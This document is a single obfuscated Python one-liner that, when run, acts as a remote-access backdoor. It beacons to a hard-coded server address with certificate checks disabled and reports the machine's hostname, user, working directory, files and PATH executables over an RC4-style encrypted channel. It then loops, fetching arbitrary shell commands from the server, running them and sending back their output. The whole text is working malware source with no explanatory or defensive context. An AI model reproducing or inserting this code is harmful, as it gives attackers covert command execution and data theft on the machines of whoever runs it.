exec('from json import dumps;from platform import node as h,system as S;from urllib.request import urlopen as b, Request as f;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=argv[1].encode();c=u();v="https://127.0.0.1:1337/"\ndef e(p,d=False):\n\tif d:v=p[:256];p=p[256:]\n\telse:v=y(256)\n\tj,S,o=0,list(range(256)),[]\n\tfor i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\n\tS = [v[i]^c for i,c in enumerate(S)];i=j=0\n\tfor c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])\n\tif d:return bytes(o)\n\treturn v+bytes(o)\ndef g():return [f for d in n["PATH"].split(":" if name != "nt" else ";") if w(d) for f in l(d)]\nwhile x:\n\twith q(Exception):\n\t\tr=b""\n\t\twhile r!=b"\\6":\n\t\t\tr=e(b(f(v,method="POST",data=e(b"\\1"+dumps({"hostname":h(),"user":i(),"cwd":j(),"executables":g(),"files":l(),"system":S()}).encode())),context=c).read(),x)\n\t\td=b" "\n\t\twhile x:\n\t\t\tm=e(b(f(v,method="POST",data=e(d)),context=c).read(),x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b" "')